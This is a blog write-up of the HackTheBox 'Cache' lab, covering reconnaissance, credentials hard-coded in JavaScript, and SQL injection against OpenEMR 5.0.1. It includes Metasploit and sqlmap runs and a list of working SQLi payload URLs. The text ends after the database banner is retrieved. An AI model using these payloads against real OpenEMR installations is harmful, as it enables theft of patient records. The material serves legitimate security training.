<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Cache</h1><div class=post-description>Cache HackTheBox writeup</div><div class=post-meta><span title='2020-10-10 19:09:00 +0000 UTC'>October 10, 2020</span>&nbsp;·&nbsp;16 min&nbsp;·&nbsp;3364 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/cache/cache.png alt="Cache HackTheBox Machine"><p>Cache - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a><ul><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration--discovery>HTTP enumeration & discovery</a></li><li><a href=#http-exploitation-openemr-sqli>HTTP exploitation (OpenEMR): SQLi</a></li><li><a href=#http-exploitation-openemr-rce>HTTP exploitation (OpenEMR): RCE</a></li><li><a href=#privilege-escalation-of-machine--www-data-to-ash>Privilege Escalation of Machine : www-data to ash</a></li><li><a href=#privilege-escalation-of-machine--ash-to-luffy>Privilege Escalation of Machine : ash to luffy</a></li><li><a href=#privilege-escalation-of-machine--luffy-to-root>Privilege Escalation of Machine : luffy to root</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Cache</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/251>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap lynx ffuf exploitdb metasploit sqlmap john docker
</code></pre><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Quick <a href=https://nmap.org/>nmap</a> scan:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Fri Jun 12 13:19:40 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.188
Nmap scan report for 10.10.10.188
Host is up (0.021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 12 13:20:07 2020 -- 1 IP address (1 host up) scanned in 26.73 seconds
</code></pre><p>Let&rsquo;s set the local domain in <code>/etc/hosts</code>:</p><pre tabindex=0><code>$ cat /etc/hosts | grep cache
10.10.10.188 cache.htb
</code></pre><h3 id=http-enumeration--discovery>HTTP enumeration & discovery<a hidden class=anchor aria-hidden=true href=#http-enumeration--discovery>#</a></h3><p>Let&rsquo;s see which pages are listed on the home page:</p><pre tabindex=0><code>$ lynx -dump -listonly -nonumbers http://cache.htb/index.html
http://cache.htb/index.html
http://cache.htb/news.html
http://cache.htb/contactus.html
http://cache.htb/login.html
http://cache.htb/author.html
</code></pre><p>If we look at the source of <code>login.html</code> we can see this script is included:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>  &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jquery/functionality.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>$</span>(<span style=color:#66d9ef>function</span>(){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>error_correctPassword</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>error_username</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>checkCorrectPassword</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>Password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#password&#34;</span>).<span style=color:#a6e22e>val</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>Password</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;H@v3_fun&#39;</span>){
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;Password didn&#39;t Match&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>error_correctPassword</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>checkCorrectUsername</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>Username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#username&#34;</span>).<span style=color:#a6e22e>val</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>Username</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;ash&#34;</span>){
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;Username didn&#39;t Match&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>error_username</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#loginform&#34;</span>).<span style=color:#a6e22e>submit</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>event</span>) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>/* Act on the event */</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>error_correctPassword</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>         <span style=color:#a6e22e>checkCorrectPassword</span>();
</span></span><span style=display:flex><span>         <span style=color:#a6e22e>error_username</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>         <span style=color:#a6e22e>checkCorrectUsername</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>error_correctPassword</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>false</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>error_username</span> <span style=color:#f92672>==</span><span style=color:#66d9ef>false</span>){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>So the creds are:</p><ul><li>username: <code>ash</code></li><li>password: <code>H@v3_fun</code></li></ul><p>That let us access to <a href=http://cache.htb/net.html>http://cache.htb/net.html</a>, a page under construction.
This is just a troll.</p><p>At <a href=http://cache.htb/author.html>http://cache.htb/author.html</a>, the author is talking about another project:
<em>HMS</em>.</p><p><code>hms</code> page or directory don&rsquo;t exist; lets&rsquo; try to enumerate more with <a href=https://github.com/ffuf/ffuf>ffuf</a>.</p><pre tabindex=0><code>$ ffuf -u http://cache.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html -fc 403

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://cache.htb/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Extensions       : .txt .html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

login.html              [Status: 200, Size: 2421, Words: 389, Lines: 106]
index.html              [Status: 200, Size: 8193, Words: 902, Lines: 339]
news.html               [Status: 200, Size: 7231, Words: 948, Lines: 100]
author.html             [Status: 200, Size: 1522, Words: 180, Lines: 68]
.                       [Status: 200, Size: 8193, Words: 902, Lines: 339]
contactus.html          [Status: 200, Size: 2539, Words: 283, Lines: 148]
jquery                  [Status: 200, Size: 951, Words: 65, Lines: 17]
net.html                [Status: 200, Size: 290, Words: 23, Lines: 19]
:: Progress: [114801/114801] :: Job [1/1] :: 1739 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
</code></pre><p>That didn&rsquo;t gave us new pages. In fact guessing was required to find another
virtual host.</p><pre tabindex=0><code>$ ffuf -u http://10.10.10.188/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H &#39;Host: FUZZ.htb&#39; -fs 8193

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.188/
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Header           : Host: FUZZ.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 8193
________________________________________________

hms                     [Status: 200, Size: 7850, Words: 1925, Lines: 159]
:: Progress: [38267/38267] :: Job [1/1] :: 911 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
</code></pre><p>Let&rsquo;s add this entry in <code>/etc/hosts</code> too.</p><pre tabindex=0><code>$ cat /etc/hosts | grep hms
10.10.10.188 hms.htb
</code></pre><p>We are quickly redirected to <a href="http://hms.htb/interface/login/login.php?site=default">http://hms.htb/interface/login/login.php?site=default</a></p><h3 id=http-exploitation-openemr-sqli>HTTP exploitation (OpenEMR): SQLi<a hidden class=anchor aria-hidden=true href=#http-exploitation-openemr-sqli>#</a></h3><p>Its seems we have an openEMR instance.</p><p>There are many exploits but we don&rsquo;t know which version this is.</p><p>Usually I never go to EDB website and only use <code>searchsploit</code>, but this time
we don&rsquo;t know the version used, the only thing we know is that is was a version
probably released in 2018 as the copyright is from 2018.</p><p>By searching on EDB website, we have the date of publication of the exploit.
So with some luck we can begin with the exploits published in 2018.</p><p><a href="https://www.exploit-db.com/search?q=openemr">https://www.exploit-db.com/search?q=openemr</a></p><p>But those two exploits require authentication. No luck.</p><p>So let&rsquo;s see what exploits are also in [Metasploit][msf]:</p><pre tabindex=0><code>msf5 &gt; search openemr

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  auxiliary/sqli/openemr/openemr_sqli_dump         2019-05-17       normal     Yes    OpenEMR 5.0.1 Patch 6 SQLi Dump
   1  exploit/unix/webapp/openemr_sqli_privesc_upload  2013-09-16       excellent  Yes    OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution
   2  exploit/unix/webapp/openemr_upload_exec          2013-02-13       excellent  Yes    OpenEMR PHP File Upload Vulnerability
</code></pre><p>The first one seems promising, let&rsquo;s set it up:</p><pre tabindex=0><code>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; options

Module options (auxiliary/sqli/openemr/openemr_sqli_dump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the OpenEMR installation
   VHOST      hms.htb          no        HTTP server virtual host
</code></pre><p>When we run it we can see the exploit works, but it seems poorly written because
it is trying to dump all system tables (295) and it&rsquo;s pretty slow.</p><pre tabindex=0><code>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; run
[*] Running module against 10.10.10.188

[*] DB Version: 5.7.30-0ubuntu0.18.04.1
[*] Enumerating tables, this may take a moment...
[*] Identified 295 tables.
[*] Dumping table (1/295): CHARACTER_SETS
[*] Dumping table (2/295): COLLATIONS
</code></pre><p>So let&rsquo;s exit that, the msf module will take hours to extract all those useless
tables.</p><p>Now we know the this SQLi is working let&rsquo;s see what exploit it is exactly:</p><pre tabindex=0><code>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; info

       Name: OpenEMR 5.0.1 Patch 6 SQLi Dump
     Module: auxiliary/sqli/openemr/openemr_sqli_dump
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2019-05-17

Provided by:
  Will Porter &lt;will.porter@lodestonesecurity.com&gt;

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the OpenEMR installation
  VHOST      hms.htb          no        HTTP server virtual host

Description:
  This module exploits a SQLi vulnerability found in OpenEMR version
  5.0.1 Patch 6 and lower. The vulnerability allows the contents of
  the entire database (with exception of log and task tables) to be
  extracted. This module saves each table as a `.csv` file in your
  loot directory and has been tested with OpenEMR 5.0.1 (3).

References:
  https://cvedetails.com/cve/CVE-2018-17179/
  https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617
</code></pre><p>In metasploit you can use the <code>edit</code> command to open your default editor on
the source code of the module.
By doing that I read the code of the msf module and saw how to detect openEMR
version with method <code>openemr_version</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>openemr_version</span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> send_request_cgi(
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;method&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;GET&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;uri&#39;</span> <span style=color:#f92672>=&gt;</span> normalize_uri(uri, <span style=color:#e6db74>&#39;admin.php&#39;</span>)
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    vprint_status(<span style=color:#e6db74>&#34;admin.php response code: </span><span style=color:#e6db74>#{</span>res<span style=color:#f92672>.</span>code<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    document <span style=color:#f92672>=</span> <span style=color:#66d9ef>Nokogiri</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HTML</span>(res<span style=color:#f92672>.</span>body)
</span></span><span style=display:flex><span>    document<span style=color:#f92672>.</span>css(<span style=color:#e6db74>&#39;tr&#39;</span>)<span style=color:#f92672>[</span><span style=color:#ae81ff>1</span><span style=color:#f92672>].</span>css(<span style=color:#e6db74>&#39;td&#39;</span>)<span style=color:#f92672>[</span><span style=color:#ae81ff>3</span><span style=color:#f92672>].</span>text
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>rescue</span> <span style=color:#66d9ef>StandardError</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>Let&rsquo;s just go to <a href=http://hms.htb/admin.php>http://hms.htb/admin.php</a> to check the version installed:</p><p>We have exactly 5.0.1 (3).</p><p>Now by reading <code>get_response</code> method we know which endpoint is requested and
which parameter is vulnerable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_response</span>(payload)
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> send_request_cgi(
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;method&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;GET&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;uri&#39;</span> <span style=color:#f92672>=&gt;</span> normalize_uri(uri, <span style=color:#e6db74>&#39;interface&#39;</span>, <span style=color:#e6db74>&#39;forms&#39;</span>, <span style=color:#e6db74>&#39;eye_mag&#39;</span>, <span style=color:#e6db74>&#39;taskman.php&#39;</span>),
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;vars_get&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;action&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;make_task&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;from_id&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;1&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;to_id&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;1&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;pid&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;1&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;doc_type&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;1&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;doc_id&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;1&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;enc&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;1&#39; and updatexml(1,concat(0x7e, (</span><span style=color:#e6db74>#{</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74>)),0) or &#39;&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    response
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>Before dumping anything we can verify manually the URL:</p><p>Fine, we can now fire [sqlmap][sqlmap], retrieve DBMS banner:</p><pre tabindex=0><code>$ sqlmap -u &#39;http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1&#39; -p enc -b --random-agent
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . [.]     | .&#39;| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:51:36 /2020-07-14/

[21:51:36] [INFO] fetched random HTTP User-Agent header value &#39;Opera/8.51 (X11; Linux i686; U; en)&#39; from file &#39;/opt/sqlmap/data/txt/user-agents.txt&#39;
[21:51:37] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own (&#39;OpenEMR=b9g6um1rbhc...dmd5cln601&#39;). Do you want to use those [Y/n] n
[21:52:08] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[21:52:08] [INFO] testing if the target URL content is stable
[21:52:38] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[21:54:08] [CRITICAL] connection timed out to the target URL
[21:54:08] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user&#39;s manual paragraph &#39;Page comparison&#39;
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
[21:54:24] [CRITICAL] can&#39;t check dynamic content because of lack of page content
[21:54:24] [INFO] heuristic (basic) test shows that GET parameter &#39;enc&#39; might be injectable (possible DBMS: &#39;MySQL&#39;)
[21:54:24] [INFO] testing for SQL injection on GET parameter &#39;enc&#39;
it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n] n
[21:54:32] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
[21:55:29] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping &#39;suspicious&#39; requests
[21:55:29] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[21:56:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[21:57:55] [CRITICAL] connection timed out to the target URL
[21:58:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[21:59:55] [CRITICAL] connection timed out to the target URL
[22:00:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[22:01:55] [CRITICAL] connection timed out to the target URL
[22:02:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
[22:03:36] [ERROR] user quit
[22:03:36] [WARNING] you haven&#39;t updated sqlmap for more than 84 days!!!

[*] ending @ 22:03:36 /2020-07-14/
</code></pre><p>It&rsquo;s kinda working but pretty slow and unstable, so let&rsquo;s find another endpoint as it seems there
are many SQLi.</p><p>There is a document <a href=https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf>OpenEMR v5.0.1.3 - Vulnerability Report</a>
for exactly the same version as us. A dozen of SQLi are listed here.</p><pre tabindex=0><code>portal/find_appt_popup_user.php?catid=1&#39; AND (SELECT 0FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -

portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))

interface/forms/eye_mag/php/Anything_simple.php?display=i&amp;encounter=1&#39; AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -&amp;category_name=POSTSEG

interface/forms_admin/forms_admin.php?id=32&#39; OR (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -&amp;method=enable

interface/de_identification_forms/find_code_popup.php?search_status=1&amp;search_term=&#39;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search

interface/de_identification_forms/find_immunization_popup.php?search_status=1&amp;search_term=&#39;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search

interface/de_identification_forms/find_code_popup.php?search_status=1&amp;search_term=&#39;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search
</code></pre><p>The ones in 3.1 and 3.2 (portal) seems to give a SQL error while those from 3.3
to 3.9 seem to require authentication.</p><p>Those two request won&rsquo;t works because we need valid cookies even if the attack is unauthenticated.
Also we need to fill the registration form with random data even if we never receive the confirmation email, this will set a valid cookie.</p><pre tabindex=0><code>$ sqlmap -u &#39;http://hms.htb/portal/add_edit_event_user.php?eid=1&#39; -p eid --random-agent --threads 10 --batch -b
$ sqlmap -u &#39;http://hms.htb/portal/find_appt_popup_user.php?catid=1&#39; -p catid --random-agent --threads 10 --batch -b
</code></pre><p>So we have to add the <code>--cookie</code> option:</p><pre tabindex=0><code>$ sqlmap -u &#39;http://hms.htb/portal/add_edit_event_user.php?eid=1&#39; -p eid --cookie &#39;OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e&#39; --random-agent --threads 10 --batch -b
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .&#39;| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:28:23 /2020-07-14/

[23:28:23] [INFO] fetched random HTTP User-Agent header value &#39;Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1&#39; from file &#39;/opt/sqlmap/data/txt/user-agents.txt&#39;
[23:28:23] [INFO] resuming back-end DBMS &#39;mysql&#39;
[23:28:23] [INFO] testing connection to the target URL
[23:28:23] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (8435=8435) THEN 1 ELSE (SELECT 1164 UNION SELECT 9741) END))

    Type: error-based
    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: eid=1 AND EXTRACTVALUE(4452,CONCAT(0x5c,0x71787a7a71,(SELECT (ELT(4452=4452,1))),0x717a716271))

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=1 AND (SELECT 5294 FROM (SELECT(SLEEP(5)))KKhg)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x73535a4b567775646f4d7849526d4b6d4a697572466f44734446724d5072526b7079474c6a616242,0x717a716271),NULL-- -
---
[23:28:23] [INFO] the back-end DBMS is MySQL
[23:28:23] [INFO] fetching banner
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL &gt;= 5.1
banner: &#39;5.7.30-0ubuntu0.18.04.1&#39;
[23:28:23] [INFO] fetched data logged to text files under &#39;/home/cyfun/.sqlmap/output/hms.htb&#39;
[23:28:23] [WARNING] you haven&#39;t updated sqlmap for more than 84 days!!!

[*] ending @ 23:28:23 /2020-07-14/
